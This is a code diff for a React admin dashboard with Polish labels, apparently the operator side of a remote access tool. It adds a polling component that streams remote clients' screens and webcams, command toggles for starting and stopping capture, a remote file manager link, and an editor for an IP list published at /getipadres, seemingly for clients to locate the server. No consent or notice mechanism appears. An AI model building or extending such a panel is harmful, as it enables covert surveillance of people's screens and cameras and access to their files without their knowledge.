@@ -16,12 +16,70 @@ const BackIcon = () => (
   </svg>
 );
 
+// --- Components ---
+const LiveStream = ({ clientId, type }: { clientId: string, type: 'screen' | 'camera' }) => {
+  const [data, setData] = useState<string | null>(null);
+  const [fps, setFps] = useState(0);
+  const lastFrameTime = useRef<number>(Date.now());
+  const framesInSecond = useRef<number>(0);
+  const secondStart = useRef<number>(Date.now());
+
+  useEffect(() => {
+    const poll = async () => {
+      try {
+        const res = await fetch(`/api/admin/${clientId}`);
+        const json = await res.json();
+        const newData = type === 'screen' ? json.screenData : json.cameraData;
+        
+        if (newData && newData !== data) {
+          setData(newData);
+          framesInSecond.current++;
+          const now = Date.now();
+          if (now - secondStart.current >= 1000) {
+            setFps(framesInSecond.current);
+            framesInSecond.current = 0;
+            secondStart.current = now;
+          }
+        }
+      } catch (e) {}
+    };
+
+    const interval = setInterval(poll, 100);
+    return () => clearInterval(interval);
+  }, [clientId, data, type]);
+
+  if (!data) return <div className="init-text">Oczekiwanie na klatki...</div>;
+
+  return (
+    <div className="stream-wrapper">
+      <img src={`data:image/jpeg;base64,${data}`} className={type === 'screen' ? "screen-img" : "cam-img"} alt={type} />
+      <div className="fps-badge">{fps} FPS</div>
+      <style jsx>{`
+        .stream-wrapper { width: 100%; height: 100%; position: relative; }
+        .screen-img { width: 100%; height: 100%; object-fit: contain; }
+        .cam-img { width: 100%; height: 100%; object-fit: cover; }
+        .fps-badge {
+          position: absolute; bottom: 10px; right: 10px;
+          background: rgba(0,0,0,0.6); color: #4ade80;
+          padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 800; font-family: monospace;
+          border: 1px solid rgba(74, 222, 128, 0.3);
+        }
+        .init-text { color: #475569; font-size: 0.8rem; }
+      `}</style>
+    </div>
+  );
+};
+
 export default function AdminPage() {
   const [clients, setClients] = useState<any[]>([]);
   const [selectedClientId, setSelectedClientId] = useState<string | null>(null);
-  const [activeClientData, setActiveClientData] = useState<any>(null);
   const [msgInput, setMsgInput] = useState("");
   const [loading, setLoading] = useState(true);
+  
+  // IP Editor State
+  const [showIpEditor, setShowIpEditor] = useState(false);
+  const [ipsContent, setIpsContent] = useState("");
+  const [savingIps, setSavingIps] = useState(false);
 
   // Poll all clients for the dashboard grid
   useEffect(() => {
@@ -34,29 +92,34 @@ export default function AdminPage() {
       } catch (e) {}
     };
     fetchAll();
-    const interval = setInterval(fetchAll, 3000); // Slower update for grid
+    const interval = setInterval(fetchAll, 3000);
     return () => clearInterval(interval);
   }, []);
 
-  // High-frequency poll for selected client (Live Monitor)
+  // Fetch IPs for editor
   useEffect(() => {
-    if (!selectedClientId) {
-      setActiveClientData(null);
-      return;
+    if (showIpEditor) {
+      fetch('/api/ips')
+        .then(res => res.json())
+        .then(data => setIpsContent(data.ips || ""));
     }
+  }, [showIpEditor]);
 
-    const fetchSingle = async () => {
-      try {
-        const res = await fetch(`/api/admin/${selectedClientId}`);
-        const data = await res.json();
-        setActiveClientData(data);
-      } catch (e) {}
-    };
-
-    fetchSingle();
-    const interval = setInterval(fetchSingle, 100); // 10 FPS polling for UI (20 FPS data available)
-    return () => clearInterval(interval);
-  }, [selectedClientId]);
+  const saveIps = async () => {
+    setSavingIps(true);
+    try {
+      await fetch('/api/ips', {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ips: ipsContent })
+      });
+      setShowIpEditor(false);
+    } catch (e) {
+      alert("Błąd zapisu!");
+    } finally {
+      setSavingIps(false);
+    }
+  };
 
   const sendMessage = async (id: string) => {
     if (!msgInput) return;
@@ -66,10 +129,6 @@ export default function AdminPage() {
       body: JSON.stringify({ id, message: msgInput })
     });
     setMsgInput("");
-    // Refresh
-    const res = await fetch('/api/admin');
-    const data = await res.json();
-    setClients(data.clients || []);
   };
 
   const toggleAction = async (id: string, action: string) => {
@@ -78,9 +137,19 @@ export default function AdminPage() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ id, message: action })
     });
+    // Optimistic update
+    setClients(prev => prev.map(c => {
+      if (c.id === id) {
+        if (action === "SCREEN:START") return { ...c, isScreenActive: true };
+        if (action === "SCREEN:STOP") return { ...c, isScreenActive: false };
+        if (action === "CAMERA:START") return { ...c, isCameraActive: true };
+        if (action === "CAMERA:STOP") return { ...c, isCameraActive: false };
+      }
+      return c;
+    }));
   };
 
-  const selectedClient = clients.find(c => c.id === selectedClientId) || activeClientData;
+  const selectedClient = clients.find(c => c.id === selectedClientId);
 
   return (
     <div className="container">
@@ -201,11 +270,6 @@ export default function AdminPage() {
           align-items: center;
           justify-content: center;
         }
-        .screen-img {
-          width: 100%;
-          height: 100%;
-          object-fit: contain;
-        }
         .sidebar {
           display: flex;
           flex-direction: column;
@@ -285,6 +349,23 @@ export default function AdminPage() {
           50% { opacity: 0.5; }
           100% { opacity: 1; }
         }
+        .ip-editor-overlay {
+          position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+          background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(8px);
+          z-index: 1000; display: flex; align-items: center; justify-content: center;
+          padding: 2rem;
+        }
+        .ip-editor-content {
+          background: #1e293b; border: 1px solid rgba(255,255,255,0.1);
+          border-radius: 24px; width: 100%; max-width: 600px; padding: 2rem;
+          box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        .textarea {
+          width: 100%; height: 300px; background: #0f172a; border: 1px solid rgba(255,255,255,0.1);
+          border-radius: 12px; color: #38bdf8; padding: 1rem; font-family: monospace;
+          font-size: 1rem; outline: none; margin-bottom: 1.5rem; resize: none;
+        }
+        .textarea:focus { border-color: #38bdf8; }
       `}</style>
 
       {!selectedClientId ? (
@@ -294,8 +375,25 @@ export default function AdminPage() {
               <h1 className="title">Control Center</h1>
               <p style={{ color: "#64748b", marginTop: "0.5rem" }}>Wybierz jednostkę do zarządzania</p>
             </div>
-            <div style={{ background: "rgba(34, 197, 94, 0.1)", color: "#22c55e", padding: "0.5rem 1rem", borderRadius: "100px", fontSize: "0.9rem", fontWeight: "600" }}>
-              {clients.length} Aktywnych
+            <div style={{ display: "flex", gap: "1rem", alignItems: "center" }}>
+              <button 
+                onClick={() => setShowIpEditor(true)}
+                style={{ 
+                  background: "rgba(56, 189, 248, 0.1)", 
+                  color: "#38bdf8", 
+                  border: "1px solid rgba(56, 189, 248, 0.2)",
+                  padding: "0.5rem 1rem", 
+                  borderRadius: "100px", 
+                  fontSize: "0.9rem", 
+                  fontWeight: "600",
+                  cursor: "pointer"
+                }}
+              >
+                🌐 Zarządzaj IP
+              </button>
+              <div style={{ background: "rgba(34, 197, 94, 0.1)", color: "#22c55e", padding: "0.5rem 1rem", borderRadius: "100px", fontSize: "0.9rem", fontWeight: "600" }}>
+                {clients.length} Aktywnych
+              </div>
             </div>
           </header>
 
@@ -315,7 +413,7 @@ export default function AdminPage() {
               {clients.length === 0 && (
                 <div style={{ gridColumn: "1/-1", textAlign: "center", padding: "4rem", background: "rgba(255,255,255,0.02)", borderRadius: "24px" }}>
                    Oczekiwanie na połączenia...
-                </div>
+                 </div>
               )}
             </div>
           )}
@@ -330,14 +428,7 @@ export default function AdminPage() {
             <div className="content-area">
               <div className="screen-container">
                 {selectedClient?.isScreenActive ? (
-                  <>
-                    {selectedClient?.screenData ? (
-                      <img src={`data:image/jpeg;base64,${selectedClient.screenData}`} className="screen-img" alt="Screen" />
-                    ) : (
-                       <div style={{ color: "#475569" }}>Inicjalizacja strumienia...</div>
-                    )}
-                    <div className="live-tag">LIVE 20 FPS</div>
-                  </>
+                  <LiveStream clientId={selectedClientId} type="screen" />
                 ) : (
                   <div style={{ textAlign: "center" }}>
                     <div style={{ color: "#475569", marginBottom: "1rem" }}>Monitor wyłączony</div>
@@ -353,11 +444,7 @@ export default function AdminPage() {
                   <div className="card-title">Kamera Systemowa</div>
                   <div style={{ height: "200px", background: "#020617", borderRadius: "12px", overflow: "hidden", position: "relative", display: "flex", alignItems: "center", justifyContent: "center" }}>
                      {selectedClient?.isCameraActive ? (
-                       selectedClient?.cameraData ? (
-                        <img src={`data:image/jpeg;base64,${selectedClient.cameraData}`} style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="Cam" />
-                       ) : (
-                        <div style={{ fontSize: "0.8rem", color: "#64748b" }}>Oczekiwanie na klatki...</div>
-                       )
+                       <LiveStream clientId={selectedClientId} type="camera" />
                      ) : (
                        <button className="btn-outline" style={{ width: "auto" }} onClick={() => toggleAction(selectedClientId, "CAMERA:START")}>Włącz kamerę</button>
                      )}
@@ -408,6 +495,31 @@ export default function AdminPage() {
                 <button className="btn-outline" onClick={() => window.location.href = `/explorer/${selectedClientId}`}>📂 Menedżer Plików</button>
                 <button className="btn-outline" onClick={() => toggleAction(selectedClientId, "SCREEN:STOP")} style={{ color: "#ef4444" }}>⏹ Zatrzymaj Monitor</button>
               </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {showIpEditor && (
+        <div className="ip-editor-overlay">
+          <div className="ip-editor-content">
+            <h2 style={{ marginBottom: "1rem", fontSize: "1.5rem", fontWeight: "800" }}>Lista Adresów IP</h2>
+            <p style={{ color: "#64748b", marginBottom: "1.5rem", fontSize: "0.9rem" }}>
+              Wpisz adresy IP (jeden pod drugim), które mają być dostępne pod adresem /getipadres.
+            </p>
+            <textarea 
+              className="textarea" 
+              value={ipsContent}
+              onChange={(e) => setIpsContent(e.target.value)}
+              placeholder="1.2.3.4&#10;5.6.7.8"
+            />
+            <div style={{ display: "flex", gap: "1rem" }}>
+              <button className="btn-primary" onClick={saveIps} disabled={savingIps}>
+                {savingIps ? "Zapisywanie..." : "Zapisz Zmiany"}
+              </button>
+              <button className="btn-outline" style={{ marginTop: 0 }} onClick={() => setShowIpEditor(false)}>
+                Anuluj
+              </button>
             </div>
           </div>
         </div>
